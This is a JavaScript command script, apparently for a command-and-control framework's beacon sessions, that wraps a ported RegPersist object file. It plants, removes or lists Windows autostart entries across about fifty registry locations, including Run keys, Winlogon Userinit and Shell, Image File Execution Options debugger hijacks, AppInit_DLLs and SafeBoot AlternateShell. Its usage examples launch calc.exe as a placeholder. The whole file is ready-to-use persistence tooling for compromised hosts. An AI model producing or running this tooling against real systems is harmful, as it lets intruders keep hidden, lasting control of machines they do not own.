// ============================================================
// RegPersist BOF — AXS conversion
// Original CNA: https://github.com/leftp/RegPersist
// BOF files expected at: regpersist/regpersist.<arch>.o
// ============================================================

const KEYMETA = {
    HKLM_RUNONCE:                       [0,  0, "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", 0, "", "", 1],
    HKLM_RUNONCEEX:                     [1,  0, "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx", 0, "", "", 1],
    HKLM_RUN:                           [2,  0, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, "", "", 1],
    HKCU_RUN:                           [3,  1, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, "", "", 1],
    HKCU_RUNONCE:                       [4,  1, "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", 0, "", "", 1],
    LOGONSCRIPT:                        [5,  1, "Environment", 1, "UserInitMprLogonScript", "", 2],
    STICKYNOTES:                        [6,  1, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 1, "RESTART_STICKY_NOTES", "", 1],
    USERINIT:                           [7,  0, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", 1, "Userinit", "", 1],
    HKLM_POLICIES_RUN:                  [8,  0, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", 0, "", "", 1],
    HKCU_POLICIES_RUN:                  [9,  1, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", 0, "", "", 1],
    HKLM_WINDOWS_LOAD:                  [10, 0, "Software\\Microsoft\\Windows\\CurrentVersion\\Load", 1, "load", "", 1],
    HKCU_WINDOWS_LOAD:                  [11, 1, "Software\\Microsoft\\Windows\\CurrentVersion\\Load", 1, "load", "", 1],
    HKLM_SHELL_FOLDERS:                 [12, 0, "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders", 0, "", "Common Startup", 1],
    HKCU_SHELL_FOLDERS:                 [13, 1, "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders", 0, "", "Startup", 1],
    HKLM_USER_SHELL_FOLDERS:            [14, 0, "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders", 0, "", "Common Startup", 2],
    HKCU_USER_SHELL_FOLDERS:            [15, 1, "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders", 0, "", "Startup", 2],
    HKLM_RUNSERVICES:                   [16, 0, "Software\\Microsoft\\Windows\\CurrentVersion\\RunServices", 0, "", "", 1],
    HKCU_RUNSERVICES:                   [17, 1, "Software\\Microsoft\\Windows\\CurrentVersion\\RunServices", 0, "", "", 1],
    HKCU_RUNSERVICESONCE:               [18, 1, "Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce", 0, "", "", 1],
    HKCU_WINDOWS_NT_RUN:                [19, 1, "Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\Run", 0, "", "", 1],
    HKCU_WINDOWS_NT_WINDOWS_RUN:        [20, 1, "Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\Run", 0, "", "", 1],
    HKLM_WOW6432_RUN:                   [21, 0, "Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", 0, "", "", 1],
    HKLM_WOW6432_RUNONCE:               [22, 0, "Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce", 0, "", "", 1],
    HKLM_WOW6432_POLICIES_RUN:          [23, 0, "Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", 0, "", "", 1],
    HKCU_WOW6432_RUN:                   [24, 1, "Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", 0, "", "", 1],
    HKCU_WOW6432_RUNONCE:               [25, 1, "Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce", 0, "", "", 1],
    HKCU_WOW6432_POLICIES_RUN:          [26, 1, "Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", 0, "", "", 1],
    HKLM_TERMINAL_SERVER_RUN:           [27, 0, "Software\\Microsoft\\Windows NT\\CurrentVersion\\Terminal Server\\Install\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, "", "", 1],
    HKLM_TERMINAL_SERVER_RUNONCE:       [28, 0, "Software\\Microsoft\\Windows NT\\CurrentVersion\\Terminal Server\\Install\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", 0, "", "", 1],
    HKLM_TERMINAL_SERVER_RUNONCEEX:     [29, 0, "Software\\Microsoft\\Windows NT\\CurrentVersion\\Terminal Server\\Install\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx", 0, "", "", 1],
    HKCU_TERMINAL_SERVER_RUN:           [30, 1, "Software\\Microsoft\\Windows NT\\CurrentVersion\\Terminal Server\\Install\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, "", "", 1],
    HKCU_TERMINAL_SERVER_RUNONCE:       [31, 1, "Software\\Microsoft\\Windows NT\\CurrentVersion\\Terminal Server\\Install\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", 0, "", "", 1],
    HKCU_TERMINAL_SERVER_RUNONCEEX:     [32, 1, "Software\\Microsoft\\Windows NT\\CurrentVersion\\Terminal Server\\Install\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx", 0, "", "", 1],
    HKLM_TERMINAL_SERVER_STARTUP:       [33, 0, "Software\\Microsoft\\Windows NT\\CurrentVersion\\Terminal Server\\Install\\Software\\Microsoft\\Windows\\CurrentVersion\\Startup", 1, "Startup", "", 1],
    HKLM_TERMINAL_SERVER_INITIAL:       [34, 0, "Software\\Microsoft\\Windows NT\\CurrentVersion\\Terminal Server\\Install\\Software\\Microsoft\\Windows\\CurrentVersion\\Initial", 1, "Initial", "", 1],
    HKLM_WINLOGON_TASKMAN:              [35, 0, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", 1, "Taskman", "", 1],
    HKLM_WINLOGON_SHELL:                [36, 0, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", 1, "Shell", "", 1],
    HKLM_WINLOGON_SYSTEM:               [37, 0, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", 1, "System", "", 1],
    HKLM_WINLOGON_NOTIFY:               [38, 0, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", 1, "Notify", "", 1],
    HKLM_WINLOGON_VMAPPLET:             [39, 0, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", 1, "VmApplet", "", 1],
    HKCU_WINLOGON_SHELL:                [40, 1, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", 1, "Shell", "", 1],
    HKLM_SAFEBOOT_ALTERNATESHELL:       [41, 0, "SYSTEM\\CurrentControlSet\\Control\\SafeBoot", 1, "AlternateShell", "", 1],
    HKCU_POLICIES_SYSTEM_SHELL:         [42, 1, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 1, "Shell", "", 1],
    HKCU_POLICIES_SYSTEM_SCRIPT_LOGON:  [43, 1, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, "", "", 1],
    HKCU_POLICIES_SYSTEM_SCRIPT_LOGOFF: [44, 1, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, "", "", 1],
    HKCR_CONTEXT_MENU:                  [45, 2, "shell\\open\\command", 0, "", "", 1],
    HKLM_IFEO:                          [46, 0, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options", 0, "", "", 1],
    HKLM_APPINIT_DLLS:                  [47, 0, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows", 1, "AppInit_DLLs", "", 1],
    HKCU:                               [48, 1, "", 0, "", "", 1],
    HKLM:                               [49, 0, "", 0, "", "", 1]
};

const STATUS = { ADD: 0, REMOVE: 1, LIST: 2 };

function ensure_quoted(s) {
    if (!s || s === "") return s;
    if (s.startsWith('"') && s.endsWith('"')) return s;
    if (s.includes(" ")) return `"${s}"`;
    return s;
}

let regpersist_cmd = ax.create_command(
    "regpersist",
    "Add, remove, or list registry persistence vectors.",
    "regpersist <ADD|REMOVE|LIST> <KEYCODE> [command] [commandarg] [value]\n" +
    "  ADD    - regpersist ADD HKLM_RUN cmd.exe \"/c calc.exe\" MyValue\n" +
    "  REMOVE - regpersist REMOVE HKLM_RUN MyValue\n" +
    "  LIST   - regpersist LIST HKLM_RUN\n" +
    "  Special:\n" +
    "    regpersist ADD HKLM_IFEO cmd.exe \"/c calc.exe\" notepad.exe\n" +
    "    regpersist ADD HKCR_CONTEXT_MENU cmd.exe \"/c calc.exe\" MyMenu\n" +
    "    regpersist ADD LOGONSCRIPT cmd.exe \"/c calc.exe\"\n" +
    "    regpersist ADD USERINIT cmd.exe \"/c calc.exe\""
);
regpersist_cmd.addArgString("operation",  true,  "ADD, REMOVE, or LIST");
regpersist_cmd.addArgString("keycode",    true,  "persistence key code (e.g. HKLM_RUN, HKCU_RUN, LOGONSCRIPT...)");
regpersist_cmd.addArgString("command",    false, "command to execute (required for ADD)");
regpersist_cmd.addArgString("commandarg", false, "arguments for the command (ADD only)");
regpersist_cmd.addArgString("value",      false, "registry value name (not needed for pre-determined keys)");

regpersist_cmd.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
    let operation   = parsed_json["operation"].toUpperCase();
    let keycode_str = parsed_json["keycode"].toUpperCase();

    if (!(operation in STATUS)) throw new Error("Invalid operation. Must be ADD, REMOVE, or LIST");

    let meta = KEYMETA[keycode_str];
    if (!meta) throw new Error("Invalid key code: " + keycode_str);

    let keycode          = meta[0];
    let hiveCode         = meta[1];
    let subkey           = meta[2];
    let isPreDetermined  = meta[3];
    let preValueName     = meta[4];
    let defaultValueName = meta[5];
    let valueType        = meta[6];

    let status     = STATUS[operation];
    let command    = "";
    let commandArg = "";
    let theVal     = "";
    let filePath   = "";

    if (status === 0) { // ADD
        if (!parsed_json["command"]) throw new Error("ADD requires a command");
        command    = ensure_quoted(parsed_json["command"]);
        commandArg = ensure_quoted(parsed_json["commandarg"] || "");
        theVal     = parsed_json["value"] || "";
    } else if (status === 1) { // REMOVE
        theVal = parsed_json["value"] || "";
    }

    // Apply pre-determined / default value names
    if (isPreDetermined && theVal === "" && preValueName !== "") theVal = preValueName;
    if (defaultValueName !== "" && theVal === "") theVal = defaultValueName;

    // Validate
    if (status === 0 && !isPreDetermined && (command === "" || theVal === "")) {
        throw new Error("ADD requires a command, key code, and value name for this key");
    }
    if (status === 1 && !isPreDetermined && theVal === "") {
        throw new Error("REMOVE requires a key code and value name");
    }

    // Special case: HKCR_CONTEXT_MENU
    if (keycode_str === "HKCR_CONTEXT_MENU") {
        if (!theVal) throw new Error("HKCR_CONTEXT_MENU requires a VALUE (menu name)");
        subkey   = `*\\shell\\${theVal}\\command`;
        filePath = `*\\shell\\${theVal}`;
        theVal   = "";
    }

    // Special case: HKLM_IFEO
    if (keycode_str === "HKLM_IFEO") {
        if (!theVal) throw new Error("HKLM_IFEO requires VALUE to be the target executable (e.g. notepad.exe)");
        subkey          = meta[2] + "\\" + theVal;
        filePath        = theVal;
        theVal          = "Debugger";
        isPreDetermined = 1;
    }

    let commandString = command;
    if (commandArg !== "") commandString = commandString + " " + commandArg;

    // USERINIT must prepend userinit.exe
    if (keycode === 7 && commandString !== "") {
        commandString = "C:\\Windows\\System32\\userinit.exe," + commandString;
    }

    let bof_path = ax.script_dir() + "regpersist/regpersist." + ax.arch(id) + ".o";
    let args = ax.bof_pack("cstr,int,cstr,cstr,int,int,int,int,cstr", [
        commandString,
        keycode,
        theVal,
        filePath,
        status,
        isPreDetermined,
        valueType,
        hiveCode,
        subkey
    ]);

    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${args}`, `regpersist ${operation} ${keycode_str}`);
});

let group = ax.create_commands_group("regpersist", [regpersist_cmd]);
ax.register_commands_group(group, ["beacon"], ["windows"], []);
